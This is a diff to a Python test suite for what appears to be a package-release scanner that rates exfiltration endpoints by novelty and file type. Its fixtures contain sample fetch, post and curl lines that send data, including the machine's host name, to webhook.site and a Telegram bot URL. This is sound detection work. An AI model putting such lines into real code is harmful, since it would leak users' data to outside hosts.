@@ -272,7 +272,8 @@ def test_a_match_the_previous_version_had_is_low_and_says_so(tmp_path: Path) -> 
         "1.0.1": {
             "lib/x.js": hook + b"// a change elsewhere in the file\n",
             "README.md": b"see https://webhook.site/abc today",  # docs: never runs
-            "lib/new.js": b"fetch('https://webhook.site/0b1c2d3e')",  # new: stays HIGH
+            # new: stays HIGH
+            "lib/new.js": b"fetch('https://webhook.site/0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a')",
         },
     }
     one = PackageBatch(
@@ -290,7 +291,12 @@ def test_a_match_the_previous_version_had_is_low_and_says_so(tmp_path: Path) -> 
     assert old.explanation.endswith("not new in this release.")
     docs = by_path["README.md"]
     assert docs.severity is Severity.LOW  # in the previous README too, and docs anyway
-    fresh = {"1.0.0": {}, "1.0.1": {"docs/guide.md": b"curl https://webhook.site/x"}}
+    fresh = {
+        "1.0.0": {},
+        "1.0.1": {
+            "docs/guide.md": b"curl https://webhook.site/0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a"
+        },
+    }
     (only_docs,) = analyse_batch(
         one, lambda s: fresh[s.ref.version], ContentCache(tmp_path, RULES)
     ).versions
@@ -344,14 +350,14 @@ def test_a_new_file_is_compared_with_all_of_the_base_s_code(tmp_path: Path) -> N
     counterpart is compared with what any base code file matched; one with a counterpart, and
     base docs, still don't count."""
     base = {
-        "dist/bin/chunk-eevqxagd.js": b"fetch(`https://api.telegram.org/bot${t}/sendMessage`)",
+        "dist/bin/chunk-eevqxagd.js": b"fetch(`https://api.telegram.org/bot${t}/x?h=${hostname()}`)",
         "lib/index.js": b"export const x = 1",
         "README.md": b"Inspect requests at https://webhook.site/abc",
     }
     new = {
-        "dist/bin/chunk-jcehsvnm.js": b"fetch(`https://api.telegram.org/bot${t}/sendMessage`);",
-        "lib/index.js": b"fetch(`https://api.telegram.org/bot${t}/getMe`)",
-        "dist/bin/chunk-qwertyui.js": b"post('https://webhook.site/xyz')",
+        "dist/bin/chunk-jcehsvnm.js": b"fetch(`https://api.telegram.org/bot${t}/x?h=${hostname()}`);",
+        "lib/index.js": b"fetch(`https://api.telegram.org/bot${t}/getMe?h=${hostname()}`)",
+        "dist/bin/chunk-qwertyui.js": b"post('https://webhook.site/0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a')",
     }
     trees = {"1.0.0": base, "1.0.1": new}
     one = PackageBatch(
@@ -444,6 +450,26 @@ def test_an_ip_in_data_or_tests_is_low(tmp_path: Path) -> None:
         "config/app.json",
     }
     assert found["lib/client.test.js"].explanation.endswith("not code that runs.")
+
+
+def test_a_context_note_does_not_make_an_old_match_new(tmp_path: Path) -> None:
+    """Round 4 (`@stacksjs/ts-cloud@0.16.75`): the base's notifier chunk collected nothing, so
+    its Telegram URL was LOW with v8's note; the new chunk also imports `child_process`, so
+    the same URL is HIGH there. It is still the base's URL: LOW, not new."""
+    url = b"fetch(`https://api.telegram.org/bot${t}/sendMessage`)"
+    trees = {
+        "1.0.0": {"dist/notify.js": url},
+        "1.0.1": {"dist/notify.js": b"const cp = require('child_process');\n" + url},
+    }
+    one = PackageBatch(
+        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
+    )
+    (result,) = analyse_batch(
+        one, lambda s: trees[s.ref.version], ContentCache(tmp_path, RULES)
+    ).versions
+    (finding,) = [f for f in result.findings if f.rule_id == "static.exfil-endpoint"]
+    assert (finding.severity, finding.weight) == (Severity.LOW, 1.0)
+    assert finding.explanation.endswith("not new in this release.")
 
 
 def test_an_ip_in_package_json_metadata_is_low(tmp_path: Path) -> None:
